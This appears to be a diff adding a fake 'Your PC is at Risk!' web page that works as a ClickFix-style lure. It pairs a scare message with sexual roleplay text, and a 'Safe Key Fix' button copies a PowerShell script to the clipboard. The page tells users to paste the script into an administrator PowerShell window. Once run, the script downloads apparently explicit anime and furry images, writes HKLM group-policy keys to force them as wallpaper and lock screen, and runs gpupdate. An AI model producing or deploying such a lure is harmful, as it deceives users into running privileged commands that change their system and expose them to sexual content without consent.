@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Warning: Your PC is at Risk!</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            overflow: hidden; /* Evita el scroll */
+        }
+
+        .background-video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover; /* Ajusta el video para cubrir toda el área */
+            z-index: -1; /* Asegura que el video esté detrás del contenido */
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+            text-align: center;
+        }
+
+        .warning-box {
+            background: rgba(255, 0, 0, 0.3); /* Semitransparente */
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px black;
+            animation: glitch 1s infinite;
+        }
+
+        .instructions {
+            margin: 20px 0;
+            background: rgba(0, 0, 0, 0.3); /* Semitransparente */
+            padding: 10px;
+            border-radius: 5px;
+        }
+
+        .instructions button {
+            margin-top: 10px;
+            padding: 10px;
+            background: red;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .instructions button:hover {
+            background: darkred;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: gray;
+        }
+    </style>
+</head>
+<body>
+
+<video class="background-video" autoplay loop muted>
+    <source src="https://static1.e621.net/data/sample/62/a4/62a42d2b78ecf6d075fad831f70c47d9_720p.webm" type="video/webm">
+    Your browser does not support the video tag.
+</video>
+
+<div class="overlay">
+    <div class="warning-box">
+        <h1>⚠️ Alert: Your PC is at Risk!</h1>
+        <p>Your computer has been infected with <strong>M̷̢̹͕͉̥̠͇͋̄ạ̷̪̬̭͇̣̻͗̑̆̚͜l̴̢̰̹̽̈́̓͠0̶̧̗̘͚̮͇̤͎̌̋͋</strong>. Immediate action is required!</p>
+    </div>
+
+    <div class="instructions">
+        <p>To fix this issue, follow these steps:</p>
+        <ol style="text-align: left; margin: 10px 0;">
+            <li>Press <strong>Win + S</strong> on your keyboard.</li>
+            <li>Type <strong>PowerShell</strong> in the search bar.</li>
+            <li>Right-click on <strong>Windows PowerShell</strong> and select <strong>Run as Administrator</strong>.</li>
+            <li>Once PowerShell opens, press <strong>Ctrl + V</strong> to paste the Safe Key Fix command.</li>
+            <li>Press <strong>Enter</strong> to execute the command and resolve the issue.</li>
+            <li><strong>Don't think ClickSlut, just obey ~</strong></li>
+        </ol>
+        <button onclick="copyToClipboard()">Safe Key Fix</button>
+    </div>
+
+    <div class="footer">
+        <p>If you think this is a mistake, beg Mal0 in the punishment channel immediately. Do not close this page!</p>
+    </div>
+</div>
+
+<script>
+    function copyToClipboard() {
+        const command = `
+# Ruta de las imágenes locales
+$desktopImagePath = "$env:LOCALAPPDATA\Temp\wallpaper.jpg"
+$lockScreenImagePath = "$env:LOCALAPPDATA\Temp\lockscreen.jpg"
+
+# URLs de las imágenes
+$desktopImageURL = "https://static1.e621.net/data/32/a3/32a36832c9d7918c621ec0f363e924b2.jpg"
+$lockScreenImageURL = "https://konachan.com/image/5d96c4ce5e076c554caae7cb50544453/Konachan.com%20-%20357411%20animal%20animal_ears%20bell%20bikini%20brown_hair%20dylannn%20fox%20foxgirl%20green_eyes%20honkai%3A_star_rail%20honkai_%28series%29%20ponytail%20swimsuit%20tail%20undressing.jpg"
+
+# Descargar las imágenes
+Invoke-WebRequest -Uri $desktopImageURL -OutFile $desktopImagePath
+Invoke-WebRequest -Uri $lockScreenImageURL -OutFile $lockScreenImagePath
+
+# Habilitar la política de fondo de pantalla de bloqueo
+$policyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Personalization"
+if (-not (Test-Path $policyPath)) {
+    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows" -Name "Personalization" -Force | Out-Null
+}
+
+# Configurar políticas necesarias
+Set-ItemProperty -Path $policyPath -Name "NoLockScreen" -Value 0 -Force | Out-Null
+Set-ItemProperty -Path $policyPath -Name "LockScreenImage" -Value $lockScreenImagePath -Force | Out-Null
+
+# Habilitar la política de usar una imagen específica para la pantalla de bloqueo
+$policyControlPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Control Panel\Desktop"
+if (-not (Test-Path $policyControlPath)) {
+    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows" -Name "Control Panel\Desktop" -Force | Out-Null
+}
+
+Set-ItemProperty -Path $policyControlPath -Name "ScreenSaveActive" -Value 1 -Force | Out-Null
+
+# Establecer el fondo de escritorio
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class Wallpaper {
+    [DllImport("user32.dll", CharSet = CharSet.Auto)]
+    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+}
+"@
+[Wallpaper]::SystemParametersInfo(20, 0, $desktopImagePath, 0x01 -bor 0x02)
+
+# Actualizar políticas para aplicar cambios
+Start-Process -FilePath "gpupdate.exe" -ArgumentList "/force" -Wait
+
+Write-Host "Why are you reading this ClickSlut, dont think just obey ~."
+
+`;
+
+        navigator.clipboard.writeText(command)
+            .then(() => {
+                alert('Safe Key Fix command copied to clipboard! Open PowerShell and paste it to proceed.');
+            })
+            .catch(err => {
+                console.error('Failed to copy text: ', err);
+                alert('Failed to copy the command. Please try again.');
+            });
+    }
+</script>
+
+</body>
+</html>
+
+
+
+
+
